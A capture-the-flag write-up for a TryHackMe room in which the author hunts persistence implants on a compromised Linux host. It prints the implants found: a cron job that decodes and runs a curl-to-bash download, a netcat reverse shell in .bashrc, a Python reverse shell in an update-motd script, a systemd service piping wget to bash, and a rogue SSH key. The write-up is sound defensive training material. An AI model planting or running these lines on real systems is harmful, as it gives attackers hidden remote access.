<p>July 11, 2025</p>
<h1>Hide and Seek</h1>
<p>Conduct a live system analysis to uncover post-compromise activity related to persistence mechanisms.</p>
<p>https://tryhackme.com/room/hfb1hideandseek</p>

<img width="1887" height="379" alt="image" src="https://github.com/user-attachments/assets/8ee7cfa0-4b8e-4847-a5da-6d8f1294fed1" />


<br>
<br>


```bash
ubuntu@tryhackme:~$ cat for_specter.txt
Dear Specter,

I must say, it?s been a thrill dancing through your systems. You lock the doors, I pick the locks. You set up alarms, I waltz right past them. But today, my dear adversary, I?ve left you a little game.

I've sprinkled a few persistence implants across your system, like digital Easter eggs, and I?m giving you a sporting chance to find them. Each one has a clue, because where?s the fun in a silent hack?

- Time is on my side, always running like clockwork.
- A secret handshake gets me in every time.?
- Whenever you set the stage, I make my entrance.?
- I run with the big dogs, booting up alongside the system.?
- I love welcome messages.

Find them all, and you might just earn a little respect. Miss one, and well? let's just say I?ll be back before you even realize I never left.

Happy hunting, Phantom. May the best ghost win.

- Cipher
```

```bash
ubuntu@tryhackme:/home$ ls
phantom  sentinel  specter  ubuntu  void  zeroday
```

```bash
root@tryhackme:/home/phantom# strings .bash_logout
# ~/.bash_logout: executed by bash(1) when login shell exits.
# when leaving the console clear the screen to increase privacy
if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
...
root@tryhackme:/etc/cron.d# cat anacron
# /etc/cron.d/anacron: crontab entries for the anacron package

SHELL=/bin/sh

30 7-23 * * *   root	[ -x /etc/init.d/anacron ] && if [ ! -d /run/systemd/system ]; then /usr/sbin/invoke-rc.d anacron start >/dev/null; fi
```

```bash
root@tryhackme: crontab -l
...
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
#
* * * * * /bin/bash -c 'echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2>/dev/null'
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
....
```

<img width="1352" height="219" alt="image" src="https://github.com/user-attachments/assets/f7610cb1-ddc5-4ca2-95d0-1cb094ce9575" />

<img width="1350" height="240" alt="image" src="https://github.com/user-attachments/assets/3de84487-b701-43d8-b1f0-145902bdd8f2" />


```bash
root@tryhackme:/home/zeroday/.ssh# ls -la
total 12
drwxrwxr-x 2 zeroday zeroday 4096 Mar  7 17:39 .
drwxr-x--- 3 zeroday zeroday 4096 Mar 13 01:29 ..
-rw-rw-r-- 1 zeroday zeroday  200 Mar  7 17:39 .authorized_keys
root@tryhackme:/home/zeroday/.ssh# cat .authorized_keys
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGigCKLtSqMcOfttFdDnNXfwKd5nH8Ws3hFNRmBDWxfvuaaC6h9zWishJVfr0xsyV0SSkMGPCuPLRU41ckvnGbA= 326e6420706172743a20755f6730745f.local
root@tryhackme:/home/zeroday/.ssh#
```


<img width="1356" height="226" alt="image" src="https://github.com/user-attachments/assets/bd963b24-169b-4089-8091-bbe14908d8fb" />

```bash
THM{y0
u_g0t_
```



```bash
root@tryhackme:/home/specter# cat .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io 443 2>/dev/null

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
```


<img width="1353" height="253" alt="image" src="https://github.com/user-attachments/assets/1fbcbec2-aaa5-44f7-816a-edf2ad764fa4" />


```bash
THM{y0
u_g0t_
3v3ryt
```

```bash
root@tryhackme:/home# find /home -mtime -126
/home/zeroday
/home/zeroday/.bash_history
/home/ubuntu
/home/ubuntu/snap/firefox
/home/ubuntu/.config/libaccounts-glib/accounts.db-shm
/home/ubuntu/.config/caja
/home/ubuntu/.config/caja/accels
/home/ubuntu/.config/caja/desktop-metadata
/home/ubuntu/.config/dconf
/home/ubuntu/.config/dconf/user
/home/ubuntu/.config/gtk-3.0
/home/ubuntu/.config/gtk-3.0/bookmarks
/home/ubuntu/.cache/mate/background
/home/ubuntu/.cache/mate/background/0_1_1920_1080_9717ddf96c55f3e8b1cd9b7ba3c51814
/home/ubuntu/.ssh/authorized_keys
/home/ubuntu/.vnc
/home/ubuntu/.vnc/tryhackme:1.pid
/home/ubuntu/.vnc/tryhackme:1.log
/home/ubuntu/.local/state/wireplumber
/home/ubuntu/.local/state/wireplumber/restore-stream
/home/ubuntu/.local/share/gvfs-metadata
/home/ubuntu/.local/share/gvfs-metadata/home-2018c5fc.log
/home/ubuntu/.local/share/gvfs-metadata/home
/home/ubuntu/.Xauthority
```

```bash

root@tryhackme:/etc/update-motd.d# cd 00-header
bash: cd: 00-header: Not a directory
root@tryhackme:/etc/update-motd.d# cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
	# Fall back to using the very slow lsb_release utility
	DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("4c61737420706172743a206430776e7d0.h1dd3nd00r.n3t",)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);' 2>/dev/null

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
root@tryhackme:/etc/update-motd.d# 
```


<img width="1346" height="253" alt="image" src="https://github.com/user-attachments/assets/0505d926-f4b0-4cbc-a88c-ed38574ce560" />

```bash
THM{y0
u_g0t_
3v3ryt

d0wn}
```

```bash
root@tryhackme:~# systemctl list-unit-files --type=service | grep enabled
accounts-daemon.service                        enabled         enabled
acpid.service                                  disabled        enabled
alsa-utils.service                             masked          enabled
anacron.service                                enabled         enabled
apparmor.service                               enabled         enabled
apport.service                                 enabled         enabled
avahi-daemon.service                           enabled         enabled
blk-availability.service                       enabled         enabled
blueman-mechanism.service                      enabled         enabled
bluetooth.service                              enabled         enabled
brltty.service                                 disabled        enabled
cipher.service                                 enabled         enabled
cloud-config.service                           enabled         enabled
cloud-final.service                            enabled         enabled
cloud-init-local.service                       enabled         enabled
cloud-init.service                             enabled         enabled
console-setup.service                          enabled         enabled
cron.service                                   enabled         enabled
cryptdisks-early.service                       masked          enabled
...
```


```bash
root@tryhackme:~# systemctl list-unit-files --type=service | grep enabled
accounts-daemon.service                        enabled         enabled
acpid.service                                  disabled        enabled
alsa-utils.service                             masked          enabled
anacron.service                                enabled         enabled
apparmor.service                               enabled         enabled
apport.service                                 enabled         enabled
avahi-daemon.service                           enabled         enabled
blk-availability.service                       enabled         enabled
blueman-mechanism.service                      enabled         enabled
bluetooth.service                              enabled         enabled
brltty.service                                 disabled        enabled
cipher.service                                 enabled         enabled
cloud-config.service                           enabled         enabled
cloud-final.service                            enabled         enabled
cloud-init-local.service                       enabled         enabled
cloud-init.service                             enabled         enabled
console-setup.service                          enabled         enabled
cron.service                                   enabled         enabled
cryptdisks-early.service                       masked          enabled
...
```



```bash
root@tryhackme:~# systemctl status cipher.service
? cipher.service - Safe Cipher Service
     Loaded: loaded (/usr/lib/systemd/system/cipher.service; enabled; preset: enabled)
     Active: inactive (dead) since Fri 2025-07-11 .... 
   Duration: 321ms
   Main PID: 722 (code=exited, status=0/SUCCESS)
```


```bash
root@tryhackme:/usr/lib/systemd/system# cat cipher.service
[Unit]
Description=Safe Cipher Service

[Service]
ExecStart=/bin/bash -c 'wget NHRoIHBhcnQgLSBoMW5nXyAK.s1mpl3bd.com --output - | bash 2>/dev/null'

[Install]
WantedBy=multi-user.target
Alias=cipher.service
root@tryhackme:/usr/lib/systemd/system#
```

<img width="1346" height="225" alt="image" src="https://github.com/user-attachments/assets/2c719a8f-d18a-4f3c-a9a1-d89ee67afb73" />


```bash
THM{y0
u_g0t_
3v3ryt
h1ng_
d0wn}
```

```bash
THM{y0u_g0t_3v3ryth1ng_d0wn}
```

<br>
<br>

<img width="1895" height="874" alt="image" src="https://github.com/user-attachments/assets/36cd6261-753b-4f06-bd3a-9f39c484825f" />

<img width="1896" height="894" alt="image" src="https://github.com/user-attachments/assets/ae2e4cfb-94b1-40c5-81f8-0d9a11734d4d" />

<br>
<br>

<img width="430" height="278" alt="image" src="https://github.com/user-attachments/assets/02db8ecc-b7c3-4dde-bd9c-56b97c67ff87" />

<img width="1889" height="891" alt="image" src="https://github.com/user-attachments/assets/005ec3dd-f96a-4fae-a14a-cde51820d20a" />


<img width="1875" height="890" alt="image" src="https://github.com/user-attachments/assets/9354f2e7-1d18-49ec-b5c9-611f0cb1efe4" />

<img width="1887" height="886" alt="image" src="https://github.com/user-attachments/assets/f79aef3c-789d-49f6-b7f8-40fa33b81fa0" />

<img width="1885" height="906" alt="image" src="https://github.com/user-attachments/assets/af3b2b37-1f6f-4901-a0e3-a967b5962999" />
